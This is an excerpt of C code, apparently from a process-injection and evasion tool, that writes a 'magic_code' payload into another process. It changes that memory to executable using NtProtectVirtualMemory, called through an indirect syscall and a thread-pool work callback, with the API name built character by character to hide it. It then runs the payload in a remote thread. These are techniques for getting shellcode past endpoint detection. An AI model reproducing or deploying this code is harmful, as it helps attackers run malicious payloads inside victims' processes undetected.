...
/// Write memory: 
    ...
    if(allocatedSize != sizeof(magic_code)) {
        printf("[-] Allocated size is not the same as magic_code size\n");
        printf("[-] Allocated size: %lu\n", allocatedSize);
        printf("[+] magic_code size: %lu\n", sizeof(magic_code));
    }
...
// protect virtual memory: 
    ...
    const char NtProtectFuture[] = { 'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };

    PVOID ProtectFuture = GetFunctionAddress(NtProtectFuture, ntdllMod);
    PVOID syscallAddr3 = findSyscallInstruction(NtProtectFuture, (FARPROC)ProtectFuture, 1);
    SSNProtectVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)ProtectFuture);
    
    ULONG oldProtect;
    NTPROTECTVIRTUALMEMORY_ARGS ntWriteProtectMemoryArgs = { 0 };
    ntWriteProtectMemoryArgs.pNtProtectVirtualMemory = (UINT_PTR) syscallAddr3;
    ntWriteProtectMemoryArgs.hProcess = pi.hProcess;
    ntWriteProtectMemoryArgs.address = &allocatedAddress;
    ntWriteProtectMemoryArgs.size = &allocatedSize;
    ntWriteProtectMemoryArgs.newProtect = PAGE_EXECUTE_READ;
    ntWriteProtectMemoryArgs.oldProtect = &oldProtect;

    // // // / Set workers

    PTP_WORK WorkReturn3 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)ProtectMemory, &ntWriteProtectMemoryArgs, NULL);
    ...
    if(WorkReturn3 == NULL) {
        ...
        printf("[+] Memory changed to PAGE_EXECUTE_READ\n");
        // printf old protection: 
    }

    //// Execution part (can be replaced with any other execution method): 

    // 1. Creating a remote thread in the target process to execute the magic_code
    ...
    if (hThread == NULL) {
        ...
        printf("[+] magic_code execution started\n");
    }
    ...
    // Wait for the magic_code to execute
